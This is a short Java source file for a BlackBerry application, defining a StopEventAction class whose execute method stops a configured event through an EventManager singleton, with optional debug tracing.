//#preprocess
package blackberry.action;

import blackberry.Trigger;
import blackberry.config.ConfAction;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.manager.EventManager;

public class StopEventAction extends EventAction {

    //#ifdef DEBUG
    private static Debug debug = new Debug("StopEventAction",
            DebugLevel.VERBOSE);
    //#endif
    
    public StopEventAction(ConfAction params) {
        super( params);
    }


    public boolean execute(Trigger trigger) {
        //#ifdef DEBUG
        debug.trace("execute: " + eventId);
        //#endif

        final EventManager eventManager = EventManager.getInstance();

        eventManager.stop(Integer.toString(eventId));
        return true;
    }

}
